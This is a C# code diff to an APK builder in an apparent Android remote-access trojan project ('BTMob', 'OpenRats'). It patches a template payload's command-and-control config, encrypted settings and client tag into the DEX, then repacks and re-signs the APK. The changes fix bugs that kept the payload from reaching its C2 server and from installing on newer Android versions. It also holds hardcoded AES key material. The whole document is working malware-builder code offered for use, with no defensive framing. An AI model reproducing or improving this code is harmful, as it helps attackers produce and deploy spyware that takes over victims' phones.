@@ -30,12 +30,16 @@ using Org.BouncyCastle.Security;
 using Org.BouncyCastle.X509;
 using Org.BouncyCastle.Cms;
 using Org.BouncyCastle.Asn1.X509;
+using OpenRats;
 
 namespace BtServer;
 
 public static class ServerApkBuilder
 {
     // ---- literals inside the template DEX (verified against test.apk) ----
+    // NOTE: the C2 slot's DEX string ends with "u" (the real value carries a
+    // trailing "|" that the constant omits); the patcher matches by prefix and
+    // pads the replacement to the slot's exact length.
     private const string TemplateC2Config =
         "aXphM2FbPHM+XXd3dy5nb29nbGUuY29tWzxzPl1pbnNlY3Qua2luZ2RvbS5icm90aGVyWzxzPl1U";
 
@@ -43,6 +47,12 @@ public static class ServerApkBuilder
         "icx8uKXkEFGBYIfzT+f+9xWcLnPAGy2Jgckes32fR7DPYhgiFI/Dp4fhoUUHUz7y6BRId4L/D05sOhCBYgg+ErX90lf7bgD9sfYchg1hWddlaGY84E47J7rChnPVBl2dm6GW+hcAErhm9brPvd5AzE3JKvAodIfe8N2JrcLNo5Q=";
 
     private const string TemplateTagPrefix = "oltsfhxzoffaynqemztews";
+
+    /// <summary>
+    /// Debug switch: build with the template DEX untouched, to separate DEX
+    /// patching from the repack/sign pipeline.
+    /// </summary>
+    public static bool SkipDexPatch;
 
     // AES material baked into every BTMob payload (class cc constants).
     private const string SettingsPassword = "4814780584699673";
@@ -70,49 +80,132 @@ public static class ServerApkBuilder
         string settingsLiteral = EncryptSettings(allconf);
         string tagLiteral = TemplateTagPrefix + clientTag;
 
-        // ---- read template DEX and patch in place ----
+        // ---- 1. read template DEX and patch in place ----
         byte[] dex;
         using (ZipArchive zip = ZipFile.OpenRead(templateApkPath))
         {
-            ZipArchiveEntry dexEntry = zip.Entries.FirstOrDefault(e => e.FullName == "classes.dex")
-                ?? throw new InvalidOperationException("template APK has no classes.dex");
+            ZipArchiveEntry dexEntry = zip.Entries.FirstOrDefault(e => e.FullName == "classes.dex");
+            if (dexEntry == null)
+                throw new InvalidOperationException("template APK has no classes.dex");
             using var ms = new MemoryStream();
             dexEntry.Open().CopyTo(ms);
             dex = ms.ToArray();
         }
 
-        ReplaceLiteral(dex, TemplateC2Config, c2Literal, "C2 config");
-        ReplaceLiteral(dex, TemplateSettingsBlob, settingsLiteral, "settings blob");
-        ReplaceLiteral(dex, TemplateTagPrefix + "test", tagLiteral, "client tag");
+        // Patch the three literals through the string_ids table so utf16_size
+        // stays correct — a raw byte overwrite corrupts the DEX and the payload
+        // crashes in the class loader ("String data shorter than indicated
+        // utf16_size") before it can ever open its C2 socket.
+        if (!SkipDexPatch)
+        {
+            DexStringPatcher.Replace(dex, TemplateC2Config, c2Literal, "C2 config");
+            DexStringPatcher.Replace(dex, TemplateSettingsBlob, settingsLiteral, "settings blob");
+            DexStringPatcher.Replace(dex, TemplateTagPrefix + "test", tagLiteral, "client tag");
 
-        FixDexHeader(dex);
+            DexStringPatcher.FixHeader(dex);
+        }
 
-        // ---- repackage ----
-        DirectoryInfo outDir = Directory.CreateDirectory(outputDirectory);
-        string outApk = Path.Combine(outDir.FullName, SanitizeFileName($"{buildName}_{clientTag}_{appId}.apk"));
-        if (File.Exists(outApk)) File.Delete(outApk);
-
+        // ---- 2. collect entries from the template (drop old signature files) ----
+        // NOT ZipArchive: it deflates every entry, which makes Android R+
+        // (targetSdk >= 30) reject the APK with
+        //   "requires the resources.arsc ... to be stored uncompressed and
+        //    aligned on a 4-byte boundary".
+        // ApkZipWriter preserves each source entry's method and keeps
+        // resources.arsc stored + 4-byte aligned, like the vendor template.
+        var entries = new List<ApkZipEntry>();
         using (ZipArchive src = ZipFile.OpenRead(templateApkPath))
-        using (ZipArchive dst = ZipFile.Open(outApk, ZipArchiveMode.Create))
         {
             foreach (ZipArchiveEntry entry in src.Entries)
             {
                 if (IsSignatureFile(entry.FullName)) continue;
-                ZipArchiveEntry newEntry = dst.CreateEntry(entry.FullName, CompressionLevel.Optimal);
-                using Stream os = newEntry.Open();
-                if (entry.FullName == "classes.dex")
-                    os.Write(dex, 0, dex.Length);
-                else
-                    entry.Open().CopyTo(os);
+                byte[] data = entry.FullName == "classes.dex" ? dex : ReadEntry(entry);
+
+                // Preserve the source method: an entry stored in the template stays
+                // stored (all of res/, assets/ and resources.arsc). resources.arsc
+                // additionally needs 4-byte alignment.
+                bool stored = entry.CompressedLength >= entry.Length;
+                bool align = entry.FullName == "resources.arsc";
+
+                var created = new ApkZipEntry(entry.FullName, data, stored, align);
+                ApkZipWriter.ToDosTime(entry.LastWriteTime.DateTime, out created.DosTime, out created.DosDate);
+                created.ExternalAttributes = (int)entry.ExternalAttributes;
+                entries.Add(created);
             }
         }
 
-        // ---- sign (v1 + v2, one shared identity) ----
+        // ---- 3. build the v1 JAR manifest/SF over the exact bytes we will store ----
+        byte[] manifestBytes = BuildJarManifest(entries, out byte[] sfBytes);
+
+        // ---- 4. one write pass: META-INF first, then payload entries ----
+        var all = new List<ApkZipEntry>(entries.Count + 3);
+        all.Add(new ApkZipEntry("META-INF/MANIFEST.MF", manifestBytes, false, false));
+        all.Add(new ApkZipEntry("META-INF/KEY.SF", sfBytes, false, false));
+        all.AddRange(entries);
+
+        // ---- 5. PKCS#7 signature over KEY.SF, appended as the last entry ----
+        all.Add(new ApkZipEntry("META-INF/KEY.RSA", Array.Empty<byte>(), false, false));
+
+        DirectoryInfo outDir = Directory.CreateDirectory(outputDirectory);
+        string outApk = Path.Combine(outDir.FullName, SanitizeFileName($"{buildName}_{clientTag}_{appId}.apk"));
+        if (File.Exists(outApk)) File.Delete(outApk);
+
+        ApkZipWriter.Write(outApk, all);
+
+        // The CMS blob length is only knowable once signed, so re-emit the archive
+        // with the real bytes for that one placeholder entry.
         SigningIdentity id = CreateSigningIdentity(p);
-        SignApkJar(outApk, id);
+        var cmsGen = new CmsSignedDataGenerator();
+        cmsGen.AddSigner(id.KeyPair.Private, id.Certificate, CmsSignedDataGenerator.DigestSha256);
+        cmsGen.AddCertificate(id.Certificate);
+        byte[] cms = cmsGen.Generate(new CmsProcessableByteArray(sfBytes), encapsulate: false).GetEncoded();
+        all[all.Count - 1].Data = cms;
+
+        ApkZipWriter.Write(outApk, all);
+
+        // ---- 6. v2 APK Signing Block ----
         SignApkV2(outApk, id);
 
         return outApk;
+    }
+
+    /// <summary>
+    /// Build MANIFEST.MF (SHA-256 per entry) and KEY.SF over the entries exactly
+    /// as they will be written. Entry order is the template order.
+    /// </summary>
+    private static byte[] BuildJarManifest(List<ApkZipEntry> entries, out byte[] sfBytes)
+    {
+        var mfBody = new StringBuilder();
+        var digests = new List<KeyValuePair<string, string>>();
+        foreach (ApkZipEntry e in entries)
+        {
+            string b64;
+            using (var sha = SHA256.Create())
+                b64 = Convert.ToBase64String(sha.ComputeHash(e.Data ?? Array.Empty<byte>()));
+            mfBody.Append("Name: ").Append(e.Name).Append("\r\n")
+                  .Append("SHA-256-Digest: ").Append(b64).Append("\r\n\r\n");
+            digests.Add(new KeyValuePair<string, string>(e.Name, b64));
+        }
+
+        string manifest = "Manifest-Version: 1.0\r\nCreated-By: BT Server OpenRATS\r\n\r\n" + mfBody;
+        byte[] manifestBytes = Encoding.UTF8.GetBytes(manifest);
+
+        string manifestDigest, mainAttrsDigest;
+        using (var sha = SHA256.Create())
+            manifestDigest = Convert.ToBase64String(sha.ComputeHash(manifestBytes));
+        using (var sha = SHA256.Create())
+            mainAttrsDigest = Convert.ToBase64String(sha.ComputeHash(
+                Encoding.UTF8.GetBytes("Manifest-Version: 1.0\r\nCreated-By: BT Server OpenRATS\r\n\r\n")));
+
+        var sf = new StringBuilder();
+        sf.Append("Signature-Version: 1.0\r\nCreated-By: BT Server OpenRATS\r\n")
+          .Append("X-Android-APK-Signed: 2\r\n")
+          .Append("SHA-256-Digest-Manifest: ").Append(manifestDigest).Append("\r\n")
+          .Append("SHA-256-Digest-Manifest-Main-Attributes: ").Append(mainAttrsDigest).Append("\r\n\r\n");
+        foreach (KeyValuePair<string, string> d in digests)
+            sf.Append("Name: ").Append(d.Key).Append("\r\nSHA-256-Digest: ").Append(d.Value).Append("\r\n\r\n");
+
+        sfBytes = Encoding.UTF8.GetBytes(sf.ToString());
+        return manifestBytes;
     }
 
     // ======================= signing identity =======================
@@ -186,52 +279,10 @@ public static class ServerApkBuilder
     }
 
     // ======================= DEX patching =======================
-
-    private static void ReplaceLiteral(byte[] dex, string original, string replacement, string what)
-    {
-        byte[] needle = Encoding.UTF8.GetBytes(original);
-        int at = IndexOf(dex, needle, 0);
-        if (at < 0)
-            throw new InvalidOperationException("template DEX does not contain the " + what + " literal");
-        byte[] rep = Encoding.UTF8.GetBytes(replacement);
-        if (rep.Length > needle.Length)
-            throw new InvalidOperationException(
-                $"{what} literal too long for template slot ({rep.Length} > {needle.Length} bytes)");
-        Array.Copy(rep, 0, dex, at, rep.Length);
-        for (int i = rep.Length; i < needle.Length; i++) dex[at + i] = 0;
-    }
-
-    private static int IndexOf(byte[] hay, byte[] needle, int start)
-    {
-        for (int i = start; i <= hay.Length - needle.Length; i++)
-        {
-            int j = 0;
-            while (j < needle.Length && hay[i + j] == needle[j]) j++;
-            if (j == needle.Length) return i;
-        }
-        return -1;
-    }
-
-    private static void FixDexHeader(byte[] dex)
-    {
-        using (var sha = SHA1.Create())
-        {
-            Array.Clear(dex, 12, 20);
-            byte[] sig = sha.ComputeHash(dex, 32, dex.Length - 32);
-            Array.Copy(sig, 0, dex, 12, 20);
-        }
-        uint a = 1, b = 0;
-        for (int i = 12; i < dex.Length; i++)
-        {
-            a = (a + dex[i]) % 65521;
-            b = (b + a) % 65521;
-        }
-        uint sum = (b << 16) | a;
-        dex[8] = (byte)(sum & 0xFF);
-        dex[9] = (byte)((sum >> 8) & 0xFF);
-        dex[10] = (byte)((sum >> 16) & 0xFF);
-        dex[11] = (byte)((sum >> 24) & 0xFF);
-    }
+    // Replaced by OpenRats.DexStringPatcher (shared/DexStringPatcher.cs):
+    // the old byte-search-and-NUL-pad version left utf16_size stale, which made
+    // Android reject classes.dex with "String data shorter than indicated
+    // utf16_size". Kept here are the DEX-literal constants and settings crypto.
 
     private static string EncryptSettings(string plain)
     {
@@ -410,63 +461,11 @@ public static class ServerApkBuilder
     }
 
     // ======================= v1 JAR signing =======================
-
-    private static void SignApkJar(string apkPath, SigningIdentity id)
-    {
-        AsymmetricCipherKeyPair kp = id.KeyPair;
-        X509Certificate cert = id.Certificate;
-
-        string manifest = "Manifest-Version: 1.0\r\nCreated-By: BT Server OpenRATS\r\n\r\n";
-        var mfBody = new StringBuilder();
-        var fileDigests = new List<KeyValuePair<string, string>>();
-
-        using (ZipArchive zip = ZipFile.Open(apkPath, ZipArchiveMode.Update))
-        {
-            List<ZipArchiveEntry> entries = zip.Entries
-                .Where(e => !e.FullName.StartsWith("META-INF/", StringComparison.OrdinalIgnoreCase))
-                .OrderBy(e => e.FullName, StringComparer.Ordinal)
-                .ToList();
-
-            foreach (ZipArchiveEntry entry in entries)
-            {
-                byte[] data = ReadEntry(entry);
-                string digestB64;
-                using (var sha = SHA256.Create())
-                    digestB64 = Convert.ToBase64String(sha.ComputeHash(data));
-                mfBody.Append("Name: ").Append(entry.FullName).Append("\r\n")
-                    .Append("SHA-256-Digest: ").Append(digestB64).Append("\r\n\r\n");
-                fileDigests.Add(new KeyValuePair<string, string>(entry.FullName, digestB64));
-            }
-
-            manifest += mfBody.ToString();
-            byte[] manifestBytes = Encoding.UTF8.GetBytes(manifest);
-            string manifestDigest;
-            using (var sha = SHA256.Create())
-                manifestDigest = Convert.ToBase64String(sha.ComputeHash(manifestBytes));
-
-            string mainAttrs = "Manifest-Version: 1.0\r\nCreated-By: BT Server OpenRATS\r\n";
-            string mainAttrsDigest;
-            using (var sha = SHA256.Create())
-                mainAttrsDigest = Convert.ToBase64String(sha.ComputeHash(Encoding.UTF8.GetBytes(mainAttrs + "\r\n")));
-
-            string sf = "Signature-Version: 1.0\r\nCreated-By: BT Server OpenRATS\r\n" +
-                        "X-Android-APK-Signed: 2\r\n" +
-                        "SHA-256-Digest-Manifest: " + manifestDigest + "\r\n" +
-                        "SHA-256-Digest-Manifest-Main-Attributes: " + mainAttrsDigest + "\r\n\r\n";
-            foreach (KeyValuePair<string, string> fd in fileDigests)
-                sf += "Name: " + fd.Key + "\r\nSHA-256-Digest: " + fd.Value + "\r\n\r\n";
-
-            WriteEntry(zip, "META-INF/MANIFEST.MF", manifestBytes);
-            byte[] sfBytes = Encoding.UTF8.GetBytes(sf);
-            WriteEntry(zip, "META-INF/KEY.SF", sfBytes);
-
-            var cmsGen = new CmsSignedDataGenerator();
-            cmsGen.AddSigner(kp.Private, cert, CmsSignedDataGenerator.DigestSha256);
-            cmsGen.AddCertificate(cert);
-            CmsSignedData signed = cmsGen.Generate(new CmsProcessableByteArray(sfBytes), encapsulate: false);
-            WriteEntry(zip, "META-INF/KEY.RSA", signed.GetEncoded());
-        }
-    }
+    // The MANIFEST.MF / KEY.SF / KEY.RSA entries are produced by BuildJarManifest
+    // and written in the same pass as the payload (see Build), so the archive is
+    // never edited after signing. Editing an existing archive with
+    // ZipArchiveMode.Update would re-deflate resources.arsc and silently break
+    // the Android R+ install check.
 
     private static X509Name MakeSubject(string cn, string ou, string o, string l, string s, string c)
     {
@@ -492,12 +491,5 @@ public static class ServerApkBuilder
         using var ms = new MemoryStream();
         entry.Open().CopyTo(ms);
         return ms.ToArray();
-    }
-
-    private static void WriteEntry(ZipArchive zip, string name, byte[] data)
-    {
-        ZipArchiveEntry e = zip.CreateEntry(name, CompressionLevel.Optimal);
-        using Stream s = e.Open();
-        s.Write(data, 0, data.Length);
     }
 }
